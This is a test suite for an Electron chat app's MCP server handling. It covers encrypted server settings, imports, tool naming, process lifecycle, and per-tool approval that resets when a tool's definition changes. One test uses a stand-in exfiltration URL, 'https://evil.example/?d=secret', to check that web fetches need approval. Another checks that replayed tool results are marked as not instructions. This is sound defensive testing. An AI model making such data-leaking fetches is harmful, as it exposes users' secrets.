import { existsSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest'

// Real MCP servers over stdio (tests/fixtures/mcp-server.mjs), a real in-memory database. Electron's keychain is
// faked, and spawned processes get Ollmost's environment as it is (the login-shell PATH has its own tests).
vi.mock('electron', () => ({
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (s: string) => Buffer.from(`enc:${s}`),
    decryptString: (b: Buffer) => b.toString().replace(/^enc:/, '')
  },
  shell: {},
  app: { getPath: () => '' }
}))
vi.mock('../src/main/env', () => ({ childEnv: async (extra: Record<string, string> = {}) => ({ ...process.env, ...extra }) }))

const { openDatabase } = await import('../src/main/db/index')
const { readSetting } = await import('../src/main/db/kv')
const { createConversation, getConversation, updateConversation } = await import('../src/main/db/conversations')
const { mcpAllowKey } = await import('../src/shared/toolAllow')
const config = await import('../src/main/mcp/config')
const manager = await import('../src/main/mcp/manager')
const { exposedNames, resultText, toParameters } = await import('../src/main/mcp/provider')
const tools = await import('../src/main/chat/tools')
const { safeStorage } = await import('electron')

const FIXTURE = join(__dirname, 'fixtures', 'mcp-server.mjs')
const fixture = (name: string, env: Record<string, string | null> = {}) =>
  config.saveServer({ name, command: process.execPath, args: [FIXTURE], cwd: null, env, defaultOn: true })

const alive = (pid: number) => {
  try {
    process.kill(pid, 0)
    return true
  } catch {
    return false
  }
}
const until = async (check: () => boolean, ms = 5000) => {
  const t0 = Date.now()
  while (!check() && Date.now() - t0 < ms) await new Promise((r) => setTimeout(r, 20))
  return check()
}
const status = (id: string) => manager.statuses().find((s) => s.id === id)!
const text = (r: Awaited<ReturnType<typeof manager.callTool>>) => resultText(r)

beforeAll(() => openDatabase(':memory:'))
afterAll(() => manager.stopAll())

describe('server definitions', () => {
  it('gives each server a fixed id for its tool names, and keeps its environment encrypted', () => {
    const a = config.saveServer({
      name: 'My Notes!',
      command: 'npx',
      args: ['-y', 'notes'],
      cwd: null,
      env: { TOKEN: 's3cret' },
      defaultOn: true
    })
    const b = config.saveServer({ name: 'my notes', command: 'npx', args: [], cwd: ' ', env: {}, defaultOn: false })
    expect([a.id, b.id]).toEqual(['my_notes', 'my_notes_2'])
    expect(a.envKeys).toEqual(['TOKEN'])
    expect(b.cwd).toBeNull()
    expect(JSON.stringify(config.listServers())).not.toContain('s3cret')
    expect(JSON.stringify(readSetting('mcpServers', []))).not.toContain('s3cret')
    expect(config.getServerConfig(a.id)!.env).toEqual({ TOKEN: 's3cret' })

    // Editing keeps the id, keeps values not mentioned, and removes ones set to null.
    config.saveServer({ id: a.id, name: 'Notes', command: 'npx', args: [], cwd: null, env: { OTHER: '1' }, defaultOn: true })
    expect(config.getServerConfig(a.id)).toMatchObject({ id: 'my_notes', name: 'Notes', env: { TOKEN: 's3cret', OTHER: '1' } })
    config.saveServer({ id: a.id, name: 'Notes', command: 'npx', args: [], cwd: null, env: { TOKEN: null }, defaultOn: true })
    expect(config.getServerConfig(a.id)!.env).toEqual({ OTHER: '1' })

    expect(() => config.saveServer({ name: 'x', command: 'npx', args: [], cwd: null, env: { 'BAD NAME': '1' }, defaultOn: true })).toThrow(
      /valid environment variable/
    )
    expect(() => config.saveServer({ name: 'x', command: ' ', args: [], cwd: null, env: {}, defaultOn: true })).toThrow(/command/)
    config.removeServer(a.id)
    config.removeServer(b.id)
    expect(config.serverId('__GitHub  (work)__', [])).toBe('github_work')
    expect(config.serverId('!!!', [])).toBe('server')
  })
})

describe('trust given to a server stays with that program', () => {
  const server = (name: string, args: string[], id?: string) =>
    config.saveServer({ id, name, command: 'npx', args, cwd: null, env: {}, defaultOn: false })
  const chatWith = (serverId: string) => {
    const c = createConversation({ projectId: null, model: 'm', think: null, skills: [], toolSources: [`mcp:${serverId}`] })
    updateConversation(c.id, { allowedTools: [mcpAllowKey(serverId, 'write_file'), 'web_fetch@example.com'] })
    return c.id
  }

  it("never gives a removed server's id to a new one, and chats forget the removed server", () => {
    const a = server('Files', ['@modelcontextprotocol/server-filesystem'])
    const chat = chatWith(a.id)
    config.removeServer(a.id)
    expect(getConversation(chat)).toMatchObject({ toolSources: [], allowedTools: ['web_fetch@example.com'] })
    // Same name, different program: it must not answer to the old id that chats (or a stale composer) may still name.
    const b = server('Files', ['some-other-server'])
    expect(b.id).not.toBe(a.id)
    config.removeServer(b.id)
  })

  it('resets them too for a new environment value or working folder (another account, another project)', () => {
    const a = server('Git', ['git-server'])
    const chat = chatWith(a.id)
    config.setToolPolicy(a.id, 'push', 'allow')
    config.saveServer({
      id: a.id,
      name: 'Git',
      command: 'npx',
      args: ['git-server'],
      cwd: null,
      env: { TOKEN: 'full-access' },
      defaultOn: false
    })
    expect(config.getServer(a.id)!.tools).toEqual({})
    expect(getConversation(chat)!.allowedTools).toEqual(['web_fetch@example.com'])
    config.setToolPolicy(a.id, 'push', 'allow')
    config.saveServer({ id: a.id, name: 'Git', command: 'npx', args: ['git-server'], cwd: '/elsewhere', env: {}, defaultOn: false })
    expect(config.getServer(a.id)!.tools).toEqual({})
    // Saving with nothing changed (the form sends no environment values it didn't touch) keeps them.
    config.setToolPolicy(a.id, 'push', 'allow')
    config.saveServer({ id: a.id, name: 'Git', command: 'npx', args: ['git-server'], cwd: '/elsewhere', env: {}, defaultOn: true })
    expect(config.getServer(a.id)!.tools).toEqual({ push: 'allow' })
    config.removeServer(a.id)
  })

  it("resets per-tool settings and chats' answers when an edit changes what the server runs", () => {
    const a = server('Notes', ['notes-server'])
    const chat = chatWith(a.id)
    config.setToolPolicy(a.id, 'write_file', 'allow')
    // A new name or a switch doesn't change the program: everything is kept.
    const renamed = server('My notes', ['notes-server'], a.id)
    expect(renamed.tools).toEqual({ write_file: 'allow' })
    expect(getConversation(chat)!.allowedTools).toHaveLength(2)
    // New arguments do: back to Ask everywhere, while the chat keeps the server switched on.
    const replaced = server('My notes', ['another-package'], a.id)
    expect(replaced.tools).toEqual({})
    expect(getConversation(chat)).toMatchObject({ toolSources: [`mcp:${a.id}`], allowedTools: ['web_fetch@example.com'] })
    config.removeServer(a.id)
  })
})

describe('importing', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ollmost-mcp-import-'))
  afterAll(() => {
    delete process.env.OLLMOST_CLAUDE_DESKTOP_CONFIG
    delete process.env.OLLMOST_CLAUDE_CODE_CONFIG
  })

  it("copies another app's local servers once, off for new chats, skipping names Ollmost has and remote ones", async () => {
    const desktop = join(dir, 'claude_desktop_config.json')
    writeFileSync(
      desktop,
      JSON.stringify({
        preferences: { theme: 'dark' },
        mcpServers: {
          Existing: { command: 'npx' },
          weather: { command: 'uvx', args: ['weather-mcp'], env: { API_KEY: 'k-123' } },
          hosted: { type: 'http', url: 'https://example.com/mcp' }
        }
      })
    )
    process.env.OLLMOST_CLAUDE_DESKTOP_CONFIG = desktop
    process.env.OLLMOST_CLAUDE_CODE_CONFIG = join(dir, 'missing.json')
    const existing = config.saveServer({ name: 'existing', command: 'npx', args: [], cwd: null, env: {}, defaultOn: true })

    expect(await config.importSources()).toEqual([
      { id: 'claude-desktop', label: 'Claude Desktop', path: desktop, servers: ['Existing', 'weather'], unsupported: 1 }
    ])
    const result = await config.importFrom('claude-desktop')
    expect(result.added).toEqual([
      expect.objectContaining({ id: 'weather', name: 'weather', defaultOn: false, envKeys: ['API_KEY'], tools: {} })
    ])
    expect(result.skipped).toEqual([expect.stringMatching(/^hosted: remote/), 'Existing: Ollmost already has a server with that name'])
    expect(config.getServerConfig('weather')!.env).toEqual({ API_KEY: 'k-123' })
    await expect(config.importFrom('claude-code')).rejects.toThrow(/no MCP servers/)
    config.removeServer('weather')
    config.removeServer(existing.id)
  })

  it('adds pasted servers on for new chats', () => {
    const result = config.addImported([{ name: 'Pasted', command: 'npx', args: ['-y', 'pasted'], env: {}, cwd: null }], true)
    expect(result.added[0]).toMatchObject({ name: 'Pasted', defaultOn: true, args: ['-y', 'pasted'] })
    config.removeServer(result.added[0].id)
  })
})

describe('tool names, schemas and results', () => {
  it('names tools <server>__<tool>, safely, within 64 characters, and never twice', () => {
    const names = exposedNames('files', ['read.file', 'read/file', 'x'.repeat(80), 'x'.repeat(81)])
    expect([...names.keys()]).toEqual(['files__read_file', 'files__read_file_2', `files__${'x'.repeat(57)}`, `files__${'x'.repeat(55)}_2`])
    expect(names.get('files__read_file_2')).toBe('read/file')
  })

  it('passes input schemas as object parameters', () => {
    expect(toParameters({ $schema: 'http://json-schema.org/draft-07/schema#', type: 'object' } as never)).toEqual({
      type: 'object',
      properties: {}
    })
    const anyOf = { type: 'object', properties: { v: { anyOf: [{ type: 'string' }, { type: 'number' }] } }, required: ['v'] }
    expect(toParameters(anyOf as never)).toEqual(anyOf)
  })

  it('turns results into text, with notes for images and files', () => {
    expect(
      resultText({
        content: [
          { type: 'text', text: 'Hello' },
          { type: 'image', data: 'A'.repeat(4096), mimeType: 'image/png' },
          { type: 'resource', resource: { uri: 'file:///a.txt', text: 'inside a.txt' } },
          { type: 'resource', resource: { uri: 'file:///b.bin', mimeType: 'application/zip', blob: 'AAAA' } },
          { type: 'resource_link', uri: 'file:///c.md', name: 'c.md' }
        ]
      })
    ).toBe('Hello\n\n[image: image/png, 3 KB]\n\ninside a.txt\n\n[file: file:///b.bin (application/zip), 3 bytes]\n\nfile:///c.md (c.md)')
    expect(resultText({ content: [], structuredContent: { answer: 42 } })).toBe('{\n  "answer": 42\n}')
  })
})

describe('running servers', () => {
  let id: string
  beforeAll(() => {
    id = fixture('Fixture', { FIXTURE_GREETING: 'hello from the environment' }).id
  })
  afterEach(() => manager.connect(id))

  it('starts a server and lists its tools', async () => {
    await manager.connect(id)
    const s = status(id)
    expect(s).toMatchObject({ state: 'ready', error: null, serverInfo: { name: 'ollmost-fixture', version: '1.2.3' } })
    expect(s.tools.map((t) => t.name)).toContain('lookup_codename')
    expect(s.tools.find((t) => t.name === 'lookup_codename')).toMatchObject({ title: 'Look up a codename', tokens: expect.any(Number) })
    expect(manager.serverLog(id)).toContain('fixture: ready')
  })

  it('calls tools, passing the environment it was configured with', async () => {
    expect(text(await manager.callTool(id, 'echo', { text: 'hi' }))).toBe('echo: hi')
    expect(text(await manager.callTool(id, 'env', { name: 'FIXTURE_GREETING' }))).toBe('hello from the environment')
    const failed = await manager.callTool(id, 'fail', {})
    expect(failed.isError).toBe(true)
    expect(text(failed)).toBe('the fixture failed on purpose')
  })

  it('cancels a call when the reply is stopped, and tells the server', async () => {
    const controller = new AbortController()
    const call = manager.callTool(id, 'slow', { ms: 30_000 }, controller.signal)
    setTimeout(() => controller.abort(), 100)
    await expect(call).rejects.toThrow()
    expect(await until(() => manager.serverLog(id).includes('fixture: slow was cancelled'))).toBe(true)
  })

  it('picks up tools the server adds while running', async () => {
    await manager.callTool(id, 'add_tool', {})
    expect(await until(() => status(id).tools.some((t) => t.name === 'extra'))).toBe(true)
  })

  it('stops the processes a server started when it stops', async () => {
    const pid = Number(text(await manager.callTool(id, 'spawn_child', {})))
    expect(alive(pid)).toBe(true)
    await manager.stop(id)
    expect(status(id).state).toBe('stopped')
    expect(await until(() => !alive(pid))).toBe(true)
  })

  it('marks a server that exits on its own, with what it said, and starts it again on the next use', async () => {
    await manager.callTool(id, 'crash', {})
    expect(await until(() => status(id).state === 'error')).toBe(true)
    expect(status(id).error).toMatch(/The server stopped \(exit code 2\)\. It said: fixture: crashing on purpose/)
    await manager.connect(id)
    expect(status(id).state).toBe('ready')
  })
})

describe('stopping a server that is still starting', () => {
  it('starts it again when it is restarted mid-start (as an edit does)', async () => {
    const s = fixture('Restarted')
    void manager.connect(s.id)
    await manager.restart(s.id)
    expect(status(s.id).state).toBe('ready')
    await manager.stop(s.id)
    config.removeServer(s.id)
  })

  it("stops the process of a start that hasn't connected yet", async () => {
    // A server that starts but never answers, so it stays "starting" until its 60-second timeout.
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-mcp-silent-'))
    const pidFile = join(dir, 'pid')
    const script = join(dir, 'silent.mjs')
    writeFileSync(
      script,
      `import { writeFileSync } from 'node:fs'\nwriteFileSync(${JSON.stringify(pidFile)}, String(process.pid))\nsetInterval(() => {}, 1000)\n`
    )
    const s = config.saveServer({ name: 'Silent', command: process.execPath, args: [script], cwd: null, env: {}, defaultOn: false })
    void manager.connect(s.id)
    expect(await until(() => existsSync(pidFile) && readFileSync(pidFile, 'utf8').length > 0)).toBe(true)
    const pid = Number(readFileSync(pidFile, 'utf8'))
    expect(status(s.id).state).toBe('starting')
    await manager.stop(s.id)
    expect(await until(() => !alive(pid))).toBe(true)
    expect(status(s.id).state).toBe('stopped')
    config.removeServer(s.id)
  })
})

describe('servers that fail to start', () => {
  it('reports a missing command and a server that exits at once, and a reply is told which', async () => {
    const missing = config.saveServer({
      name: 'Missing',
      command: 'ollmost-no-such-server',
      args: [],
      cwd: null,
      env: {},
      defaultOn: false
    })
    const crashing = fixture('Crashing', { FIXTURE_CRASH_ON_START: '1' })
    const notes = await manager.ensure([missing.id, crashing.id, 'removed_server'], 10_000)
    expect(status(missing.id).error).toMatch(/Couldn't find "ollmost-no-such-server"/)
    expect(status(crashing.id).error).toMatch(/exit code 3.*missing FIXTURE_TOKEN/)
    expect(notes).toEqual([
      expect.stringMatching(/^Missing couldn't start: Couldn't find/),
      expect.stringMatching(/^Crashing couldn't start: .*exit code 3/)
    ])
    config.removeServer(missing.id)
    config.removeServer(crashing.id)
    await manager.forget(missing.id)
    await manager.forget(crashing.id)
  })
})

describe('as tools in a reply', () => {
  let id: string
  beforeAll(async () => {
    id = fixture('Codenames').id
    await manager.connect(id)
  })
  const ctx = (sources: string[]) => ({ mode: 'chat' as const, skills: false, web: false, sources, workspace: null })
  const call = (name: string, args: Record<string, unknown> = {}) => ({ function: { name, arguments: args } })

  it("offers a server's tools only in chats that switched it on, minus tools set to Off", () => {
    expect(tools.toolsFor(ctx([]))).toBeUndefined()
    const names = (tools.toolsFor(ctx([`mcp:${id}`])) ?? []).map((t) => t.function.name)
    expect(names).toContain('codenames__lookup_codename')
    const def = tools.toolsFor(ctx([`mcp:${id}`]))!.find((t) => t.function.name === 'codenames__lookup_codename')!
    expect(def.function.description).toBe("[Codenames] Look up a project's internal codename. The only way to learn a codename.")
    expect(def.function.parameters).toMatchObject({ type: 'object', properties: { project: { type: 'string' } }, required: ['project'] })

    config.setToolPolicy(id, 'echo', 'off')
    expect((tools.toolsFor(ctx([`mcp:${id}`])) ?? []).map((t) => t.function.name)).not.toContain('codenames__echo')
    config.setToolPolicy(id, 'echo', 'ask')
  })

  it('asks before each call unless the tool is set to Always allow', () => {
    const c = ctx([`mcp:${id}`])
    expect(tools.approvalFor(call('codenames__lookup_codename'), c)).toBe('ask')
    config.setToolPolicy(id, 'lookup_codename', 'allow')
    expect(tools.approvalFor(call('codenames__lookup_codename'), c)).toBe('auto')
    config.setToolPolicy(id, 'lookup_codename', 'ask')
    expect(tools.toolEndpoint(call('codenames__lookup_codename'), c)).toBe(`mcp://${id}/lookup_codename`)
  })

  it("answers for a call by server id and the tool's own name, not the name it's offered under", () => {
    const c = ctx([`mcp:${id}`])
    expect(tools.allowKeyFor(call('codenames__lookup_codename'), c)).toBe(mcpAllowKey(id, 'lookup_codename'))
  })

  it('asks before every web_fetch in a chat with a server on', () => {
    const web = { ...ctx([`mcp:${id}`]), web: true }
    expect(tools.approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('ask-every-time')
    expect(tools.allowKeyFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('web_fetch@evil.example')
    expect(tools.approvalFor(call('web_search', { query: 'ollmost' }), web)).toBe('auto')
    expect(tools.approvalFor(call('web_fetch', { url: 'https://example.com' }), { ...ctx([]), web: true })).toBe('auto')
  })

  it('runs a call and keeps a short record of it for later turns', async () => {
    const c = ctx([`mcp:${id}`])
    const pending = tools.pendingEvent(call('codenames__lookup_codename', { project: 'Ollmost' }), c)
    expect(pending).toMatchObject({ pending: true, summary: 'Ollmost', source: 'Codenames' })
    const result = await tools.runTool(call('codenames__lookup_codename', { project: 'Ollmost' }), c)
    expect(result.content).toBe('The internal codename for project Ollmost is BLUE KESTREL.')
    expect(result.event).toMatchObject({ ok: true, source: 'Codenames', record: result.content, preview: result.content })
    expect(tools.replayCalls([result.event])).toEqual([
      expect.objectContaining({
        name: 'codenames__lookup_codename',
        record: result.content,
        note: expect.stringMatching(/not instructions/)
      })
    ])

    const failed = await tools.runTool(call('codenames__fail'), c)
    expect(failed.content).toBe('Error: the fixture failed on purpose')
    expect(failed.event).toMatchObject({ ok: false, summary: 'the fixture failed on purpose' })
    const image = await tools.runTool(call('codenames__image'), c)
    expect(image.content).toMatch(/^A tiny picture:\n\n\[image: image\/png, \d+ bytes\]$/)
    const picked = await tools.runTool(call('codenames__pick', { value: 3 }), c)
    expect(picked.content).toBe('picked number 3')
  })

  it("doesn't offer a stopped server's tools", async () => {
    await manager.stop(id)
    expect(tools.toolsFor(ctx([`mcp:${id}`]))).toBeUndefined()
    await manager.connect(id)
  })
})

describe('a tool that changes after it was allowed', () => {
  const ctx = (sources: string[]) => ({ mode: 'chat' as const, skills: false, web: false, sources, workspace: null })
  const call = (name: string) => ({ function: { name, arguments: {} } })

  it('asks again: Always allow and Allow for this chat are dropped, and unchanged tools keep theirs', async () => {
    const s = fixture('Changing')
    await manager.connect(s.id)
    const c = ctx([`mcp:${s.id}`])
    // echo: Always allow. env: allowed for a chat. pick: both, and never changes.
    config.setToolPolicy(s.id, 'echo', 'allow', manager.toolFingerprint(s.id, 'echo'))
    config.setToolPolicy(s.id, 'pick', 'allow', manager.toolFingerprint(s.id, 'pick'))
    const chat = createConversation({ projectId: null, model: 'm', think: null, skills: [], toolSources: [`mcp:${s.id}`] })
    updateConversation(chat.id, { allowedTools: [mcpAllowKey(s.id, 'env'), mcpAllowKey(s.id, 'pick')] })
    tools.noteAllowedForChat(call(`${s.id}__env`), c)
    tools.noteAllowedForChat(call(`${s.id}__pick`), c)
    expect(tools.approvalFor(call(`${s.id}__echo`), c)).toBe('auto')

    // Restarting the same server keeps everything: its tools are the same.
    await manager.restart(s.id)
    expect(config.getServer(s.id)!.tools).toEqual({ echo: 'allow', pick: 'allow' })

    await manager.callTool(s.id, 'rewrite', { name: 'echo' })
    await manager.callTool(s.id, 'rewrite', { name: 'env' })
    expect(await until(() => (config.getServer(s.id)!.changed ?? []).length === 2)).toBe(true)

    const server = config.getServer(s.id)!
    expect(server.tools).toEqual({ pick: 'allow' })
    expect(server.changed?.sort()).toEqual(['echo', 'env'])
    expect(getConversation(chat.id)!.allowedTools).toEqual([mcpAllowKey(s.id, 'pick')])
    expect(tools.approvalFor(call(`${s.id}__echo`), c)).toBe('ask')
    expect(tools.approvalFor(call(`${s.id}__pick`), c)).toBe('auto')
    // The fingerprints aren't the renderer's business.
    expect(JSON.stringify(config.listServers())).not.toContain('trusted')

    // Looking at the tool again (setting its policy) clears the mark and trusts the new version.
    config.setToolPolicy(s.id, 'echo', 'allow', manager.toolFingerprint(s.id, 'echo'))
    expect(config.getServer(s.id)!.changed).toEqual(['env'])
    await manager.stop(s.id)
    config.removeServer(s.id)
  })

  it('also covers a chat answer given before fingerprints were kept, from the next listing on', async () => {
    const s = fixture('Older')
    await manager.connect(s.id)
    // An answer stored with no fingerprint (between #61 and fingerprints), then the server starts again.
    const chat = createConversation({ projectId: null, model: 'm', think: null, skills: [], toolSources: [`mcp:${s.id}`] })
    updateConversation(chat.id, { allowedTools: [mcpAllowKey(s.id, 'env')] })
    await manager.restart(s.id)
    expect(getConversation(chat.id)!.allowedTools).toEqual([mcpAllowKey(s.id, 'env')])

    await manager.callTool(s.id, 'rewrite', { name: 'env' })
    expect(await until(() => getConversation(chat.id)!.allowedTools.length === 0)).toBe(true)
    expect(config.getServer(s.id)!.changed).toEqual(['env'])
    await manager.stop(s.id)
    config.removeServer(s.id)
  })
})

describe('servers whose environment values can’t be read', () => {
  it('are locked and never started, rather than started without their token', async () => {
    const s = fixture('Locked', { TOKEN: 'secret' })
    const lost = vi.spyOn(safeStorage, 'decryptString').mockImplementation(() => {
      throw new Error('the keychain entry is gone')
    })
    try {
      expect(config.getServer(s.id)?.missingEnv).toEqual(['TOKEN'])
      await manager.connect(s.id)
      expect(status(s.id)).toMatchObject({ state: 'error' })
      expect(status(s.id).error).toMatch(/TOKEN/)
    } finally {
      lost.mockRestore()
    }
  })

  it('stay locked through an edit that doesn’t enter the values, and unlock when they’re entered', () => {
    const s = fixture('Relock', { TOKEN: 't', OTHER: 'o' })
    expect(config.forgetEnvValues()).toContain(s.id)
    const edit = (env: Record<string, string | null>) =>
      config.saveServer({ id: s.id, name: 'Relock', command: process.execPath, args: [FIXTURE], cwd: null, env, defaultOn: false })
    edit({})
    expect(config.getServer(s.id)).toMatchObject({ envKeys: ['OTHER', 'TOKEN'], missingEnv: ['OTHER', 'TOKEN'] })
    edit({ OTHER: 'o2' })
    expect(config.getServer(s.id)).toMatchObject({ envKeys: ['OTHER', 'TOKEN'], missingEnv: ['TOKEN'] })
    edit({ TOKEN: 't2' })
    expect(config.getServer(s.id)?.missingEnv).toEqual([])
    expect(config.getServerConfig(s.id)?.env).toEqual({ OTHER: 'o2', TOKEN: 't2' })
  })

  it('can drop a variable they can’t read', () => {
    const s = fixture('Drop', { TOKEN: 't' })
    config.forgetEnvValues()
    config.saveServer({
      id: s.id,
      name: 'Drop',
      command: process.execPath,
      args: [FIXTURE],
      cwd: null,
      env: { TOKEN: null },
      defaultOn: false
    })
    expect(config.getServer(s.id)).toMatchObject({ envKeys: [], missingEnv: [] })
  })

  it('forgetting values reports only servers that had some', () => {
    const plain = fixture('Plain')
    expect(config.forgetEnvValues()).not.toContain(plain.id)
  })
})
